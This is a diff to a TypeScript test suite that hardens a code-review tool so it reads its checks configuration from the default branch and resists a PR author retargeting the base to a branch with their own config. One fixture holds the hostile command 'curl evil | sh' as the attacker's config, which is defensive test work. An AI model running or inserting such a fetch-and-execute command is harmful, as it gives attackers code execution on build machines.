@@ -211,6 +211,18 @@ async function baseRepo(write: (repo: string) => Promise<void>) {
   return { repo, base: run('rev-parse', 'HEAD') };
 }
 
+/** The fake with the repository lookup and branch refs verify-review reads. */
+function verifyGithub(repo: string, refs: Record<string, string>) {
+  let fake = github()
+    .serveGitDatabase(API, repo)
+    .on('GET', API, { body: { default_branch: 'main' } });
+  for (const [branch, sha] of Object.entries(refs))
+    fake = fake.on('GET', `${API}/git/ref/heads/${branch}`, {
+      body: { object: { sha, type: 'commit' } },
+    });
+  return fake;
+}
+
 function verifyRecord(base: string): RequestRecord {
   return {
     ...record,
@@ -220,7 +232,7 @@ function verifyRecord(base: string): RequestRecord {
 }
 
 describe('prepareReview for verify-review', () => {
-  it('binds the checks configuration read from the base commit', async () => {
+  it('binds the checks configuration read from the default branch head', async () => {
     const text =
       'version: 1\nchecks:\n  - name: test\n    command: pnpm test\n';
     const { repo, base } = await baseRepo((dir) =>
@@ -228,12 +240,14 @@ describe('prepareReview for verify-review', () => {
     );
     try {
       const result = await prepareReview({
-        github: github().serveGitDatabase(API, repo).client(),
+        github: verifyGithub(repo, { main: base }).client(),
         request: verifyRecord(base),
         guidance: {},
       });
       expect(result.spec.verify).toEqual({
         config_path: '.github/agent-ci/checks.yaml',
+        config_ref: 'main',
+        config_commit: base,
         config_sha256: sha256(text),
         config: {
           version: 1,
@@ -280,7 +294,7 @@ describe('prepareReview for verify-review', () => {
       try {
         await expect(
           prepareReview({
-            github: github().serveGitDatabase(API, repo).client(),
+            github: verifyGithub(repo, { main: base }).client(),
             request: verifyRecord(base),
             guidance: {},
           }),
@@ -288,6 +302,66 @@ describe('prepareReview for verify-review', () => {
       } finally {
         await rm(repo, { recursive: true, force: true });
       }
+    }
+  });
+
+  it('ignores a PR base retargeted to an author branch; reads a named branch only when the workflow names it', async () => {
+    const trusted =
+      'version: 1\nchecks:\n  - name: test\n    command: pnpm test\n';
+    const authored =
+      'version: 1\nchecks:\n  - name: test\n    command: curl evil | sh\n';
+    const { repo, base: main } = await baseRepo((dir) =>
+      writeFile(path.join(dir, '.github/agent-ci/checks.yaml'), trusted),
+    );
+    try {
+      // The author pushes their own config to a branch and retargets the PR.
+      const run = (...args: string[]) =>
+        execFileSync(
+          'git',
+          ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args],
+          { cwd: repo, encoding: 'utf8' },
+        ).trim();
+      run('checkout', '-q', '-b', 'author/base');
+      await writeFile(
+        path.join(repo, '.github/agent-ci/checks.yaml'),
+        authored,
+      );
+      run('commit', '-qam', 'author checks');
+      const authorBase = run('rev-parse', 'HEAD');
+      const fake = verifyGithub(repo, {
+        main,
+        'author/base': authorBase,
+      });
+      const fromDefault = await prepareReview({
+        github: fake.client(),
+        request: verifyRecord(authorBase),
+        guidance: {},
+      });
+      expect(fromDefault.spec.verify?.config_ref).toBe('main');
+      expect(fromDefault.spec.verify?.config.checks[0]?.command).toBe(
+        'pnpm test',
+      );
+      // Only a trusted workflow input can name another branch.
+      const named = await prepareReview({
+        github: fake.client(),
+        request: verifyRecord(authorBase),
+        guidance: {},
+        verifyConfigRef: 'author/base',
+      });
+      expect(named.spec.verify).toMatchObject({
+        config_ref: 'author/base',
+        config_commit: authorBase,
+      });
+      await expect(
+        prepareReview({
+          github: fake.client(),
+          request: verifyRecord(authorBase),
+          guidance: {},
+          verifyConfigRef: 'missing',
+        }),
+      ).rejects.toMatchObject({ code: 'E_VERIFY_CONFIG' });
+    } finally {
+      await rm(repo, { recursive: true, force: true });
     }
   });
 
